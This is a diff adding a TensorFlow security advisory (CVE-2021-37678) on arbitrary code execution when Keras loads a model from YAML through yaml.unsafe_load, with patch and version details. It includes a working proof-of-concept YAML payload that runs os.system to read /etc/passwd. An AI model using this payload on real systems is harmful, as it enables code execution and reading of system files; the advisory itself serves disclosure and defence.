@@ -1,0 +1,33 @@
+<h2>TFSA-2021-152: Arbitrary code execution due to YAML deserialization</h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-37678</p>
+<h3>Impact</h3>
+<p>TensorFlow and Keras can be tricked to perform arbitrary code execution when
+deserializing a Keras model from YAML format.</p>
+<p>```python
+from tensorflow.keras import models</p>
+<p>payload = '''
+!!python/object/new:type
+args: ['z', !!python/tuple [], {'extend': !!python/name:exec }]
+listitems: "<strong>import</strong>('os').system('cat /etc/passwd')"
+'''</p>
+<p>models.model_from_yaml(payload)
+```</p>
+<p>The
+<a href="https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/python/keras/saving/model_config.py#L66-L104">implementation</a>
+uses <code>yaml.unsafe_load</code> which can perform arbitrary code execution on the input.</p>
+<h3>Patches</h3>
+<p>Given that YAML format support requires a significant amount of work, we have
+removed it for now.</p>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/23d6383eb6c14084a8fc3bdf164043b974818012">23d6383eb6c14084a8fc3bdf164043b974818012</a>.</p>
+<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this
+commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are
+also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Arjun Shibu.</p>
